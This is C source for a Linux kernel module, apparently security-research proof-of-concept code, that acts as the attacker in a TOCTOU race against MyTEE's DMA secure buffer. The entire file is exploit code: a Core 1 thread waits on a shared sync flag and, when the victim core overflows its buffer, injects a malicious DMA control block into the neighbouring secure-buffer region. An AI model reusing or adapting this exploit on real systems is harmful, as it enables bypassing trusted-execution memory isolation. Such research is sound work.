/*
 * MyTEE TOCTOU Attack - Attacker Module (runs on Core 1)
 * 
 * This module demonstrates the TOCTOU vulnerability in MyTEE's DMA
 * secure buffer. It runs on Core 1 and injects malicious control blocks
 * when the victim (Core 0) overflows its buffer.
 *
 * The attack exploits:
 * 1. No boundary check when copying CBs to secure buffer
 * 2. No core isolation between adjacent buffer regions
 * 3. Race condition between verification and DMA execution
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/io.h>
#include <linux/delay.h>
#include <linux/kthread.h>
#include <linux/smp.h>
#include <linux/slab.h>

#include "toctou_common.h"

#define DRIVER_NAME "toctou_attacker"

/* Module parameters */
static int debug = 1;
module_param(debug, int, 0644);
MODULE_PARM_DESC(debug, "Enable debug output");

static int auto_start = 0;
module_param(auto_start, int, 0644);
MODULE_PARM_DESC(auto_start, "Auto-start attack thread on module load");

/* Runtime state */
static void __iomem *sync_flag_base;
static void __iomem *secure_buffer_base;
static struct task_struct *attack_thread;
static volatile int stop_attack = 0;

static inline void sync_write(u32 offset, u32 value)
{
    if (sync_flag_base) {
        writel(value, sync_flag_base + offset);
        wmb();
    }
}

static inline u32 sync_read(u32 offset)
{
    if (sync_flag_base) {
        rmb();
        return readl(sync_flag_base + offset);
    }
    return 0;
}

static void log_debug(const char *fmt, ...)
{
    va_list args;
    if (debug) {
        va_start(args, fmt);
        vprintk(fmt, args);
        va_end(args);
    }
}

/*
 * Inject malicious CB into Core 1's secure buffer region.
 * This CB will be executed by DMA when it follows the chain
 * from Core 0's overflow.
 */
static void trigger_malicious_dma(void)
{
    void __iomem *core1_buffer;
    int my_core = smp_processor_id();

    if (!secure_buffer_base) {
        pr_err("[ATTACKER] Secure buffer not mapped\n");
        return;
    }

    core1_buffer = secure_buffer_base + (1 * SECURE_BUFFER_SIZE_PER_CORE);

    log_debug("[ATTACKER] Core %d injecting malicious CB at %p\n",
              my_core, core1_buffer);

    /* Write malicious CB to Core 1's buffer */
    writel(ATTACK_MAGIC_INFO, core1_buffer + 0x00);   /* info */
    writel(ATTACK_MAGIC_SRC, core1_buffer + 0x04);    /* src */
    writel(ATTACK_MAGIC_DST, core1_buffer + 0x08);    /* dst */
    writel(ATTACK_MAGIC_LENGTH, core1_buffer + 0x0C); /* length */
    writel(0, core1_buffer + 0x10);                   /* stride */
    writel(0, core1_buffer + 0x14);                   /* next = NULL */
    wmb();

    log_debug("[ATTACKER] Malicious CB injected!\n");
    log_debug("[ATTACKER] Verify: info=0x%08x src=0x%08x dst=0x%08x\n",
              readl(core1_buffer + 0x00),
              readl(core1_buffer + 0x04),
              readl(core1_buffer + 0x08));
}

/*
 * Attack thread - waits for sync signal and injects malicious CB
 */
static int attack_thread_fn(void *data)
{
    u32 state;
    int my_core;

    /* Ensure we're on Core 1 */
    set_cpus_allowed_ptr(current, cpumask_of(1));
    my_core = smp_processor_id();

    pr_info("[ATTACKER] Attack thread started on Core %d\n", my_core);

    while (!kthread_should_stop() && !stop_attack) {
        state = sync_read(SYNC_OFFSET_STATE);

        switch (state) {
        case SYNC_STATE_VICTIM_READY:
            log_debug("[ATTACKER] Victim ready, waiting for trap...\n");
            break;

        case SYNC_STATE_VICTIM_TRAPPED:
            log_debug("[ATTACKER] Victim trapped! Injecting malicious CB...\n");
            trigger_malicious_dma();
            sync_write(SYNC_OFFSET_STATE, SYNC_STATE_ATTACKER_INJECT);
            break;

        case SYNC_STATE_ATTACK_DONE:
            log_debug("[ATTACKER] Attack sequence completed\n");
            if (sync_read(SYNC_OFFSET_ATTACK_RESULT) == 1) {
                pr_info("[ATTACKER] *** ATTACK SUCCESS! ***\n");
            }
            sync_write(SYNC_OFFSET_STATE, SYNC_STATE_IDLE);
            break;

        default:
            break;
        }

        usleep_range(10, 50);
    }

    pr_info("[ATTACKER] Attack thread stopping\n");
    return 0;
}

static int __init toctou_attacker_init(void)
{
    pr_info("[ATTACKER] Loading TOCTOU attacker module\n");

    /* Map sync flag memory */
    sync_flag_base = ioremap(SYNC_FLAG_PHYS, SYNC_FLAG_SIZE);
    if (!sync_flag_base) {
        pr_err("[ATTACKER] Failed to map sync flag memory\n");
        return -ENOMEM;
    }

    /* Map secure buffer region */
    secure_buffer_base = ioremap(SECURE_BUFFER_BASE_PHYS,
                                  SECURE_BUFFER_SIZE_PER_CORE * NUM_CORES);
    if (!secure_buffer_base) {
        pr_err("[ATTACKER] Failed to map secure buffer\n");
        iounmap(sync_flag_base);
        return -ENOMEM;
    }

    pr_info("[ATTACKER] Secure buffer mapped at %p\n", secure_buffer_base);

    /* Initialize sync state */
    sync_write(SYNC_OFFSET_STATE, SYNC_STATE_IDLE);

    /* Start attack thread if auto_start enabled */
    if (auto_start) {
        attack_thread = kthread_run(attack_thread_fn, NULL, "toctou_attacker");
        if (IS_ERR(attack_thread)) {
            pr_err("[ATTACKER] Failed to create attack thread\n");
            attack_thread = NULL;
        }
    }

    pr_info("[ATTACKER] Module loaded. Use 'echo 1 > /sys/module/toctou_attacker/parameters/auto_start' to start\n");
    return 0;
}

static void __exit toctou_attacker_exit(void)
{
    pr_info("[ATTACKER] Unloading module\n");

    stop_attack = 1;

    if (attack_thread)
        kthread_stop(attack_thread);

    if (secure_buffer_base)
        iounmap(secure_buffer_base);

    if (sync_flag_base)
        iounmap(sync_flag_base);

    pr_info("[ATTACKER] Module unloaded\n");
}

module_init(toctou_attacker_init);
module_exit(toctou_attacker_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Security Research");
MODULE_DESCRIPTION("MyTEE TOCTOU Attack - Attacker Module");
